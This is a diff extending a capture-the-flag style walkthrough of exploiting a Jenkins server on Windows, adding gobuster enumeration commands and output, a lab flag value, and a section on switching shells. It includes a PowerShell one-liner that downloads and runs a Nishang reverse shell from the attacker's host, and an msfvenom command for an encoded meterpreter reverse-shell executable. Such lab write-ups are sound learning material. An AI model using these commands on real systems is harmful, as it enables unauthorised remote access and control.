@@ -9,6 +9,10 @@ In this room, we'll learn how to exploit a common misconfiguration on a widely u
 
 Since this is a Windows application, we'll be using Nishang(opens in new tab) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts(opens in new tab).
 
+```
+git clone https://github.com/samratashok/nishang
+```
+
 Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
 
 NMAP scan (no ping Pn): 
@@ -95,6 +99,41 @@ Server: Jetty(9.4.z-SNAPSHOT)
 ```
 It was also worth considering some applications with java used to have password hardcoded into the applications. so it was worth looking at gobuster to check what folders or files could be enumerated. No real luck  the two files with status code 200 the reset 
 
+```
+gobuster dir -u http://TARGET-IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -x php,txt,html -e -k
+
+gobuster dir -u http://10.48.136.91:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html -e -k --status-codes-blacklist 404,403,302,301>out5.txt
+
+
+# cat out3.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.182.255:8080
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+[+] Negative Status codes:   403,302,301,404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,html,php
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+http://10.48.182.255:8080/robots.txt           (Status: 200) [Size: 71]
+http://10.48.182.255:8080/login                (Status: 200) [Size: 1942]
+http://10.48.182.255:8080/oops                 (Status: 500) [Size: 9389]
+http://10.48.182.255:8080/j_security_check     (Status: 303) [Size: 0] [--> http://10.48.182.255:8080/loginError]
+
+===============================================================
+Finished
+
+nothing really usable. 
+```
+
+
 
 Q4: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 
@@ -138,4 +177,16 @@ Mode                LastWriteTime     Length Name
 ----                -------------     ------ ----                              
 -a---        10/25/2019  11:22 PM         32 user.txt                          
 
+PS C:\Program Files (x86)\Jenkins\workspace\project> type c:\users\bruce\desktop\user.txt
+79007a09481963edf2e1321abd9ae2a0
+PS C:\Program Files (x86)\Jenkins\workspace\project> 
+
 ```
+
+# Task 2: Switching shells
+
+To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.
+
+Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
